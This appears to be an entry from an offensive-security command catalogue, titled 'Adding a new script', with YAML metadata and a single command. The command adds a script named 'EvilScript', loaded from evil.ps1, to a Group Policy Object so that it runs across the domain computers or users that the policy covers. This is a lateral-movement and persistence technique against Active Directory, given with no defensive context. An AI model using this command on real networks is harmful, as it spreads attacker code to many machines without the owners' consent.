---
id: c68bb944-c98e-487a-81c8-19661e54d99e
name: Adding a new script
type: command
executor: bash
data: Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content
  evil.ps1) -GPOIdentity 'SuperSecureGPO'
output: null
created_at: '2023-04-06T03:56:03.665044+00:00'
updated_at: '2023-04-10T20:26:15.994624+00:00'
---

# Adding a new script

```bash
Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'
```
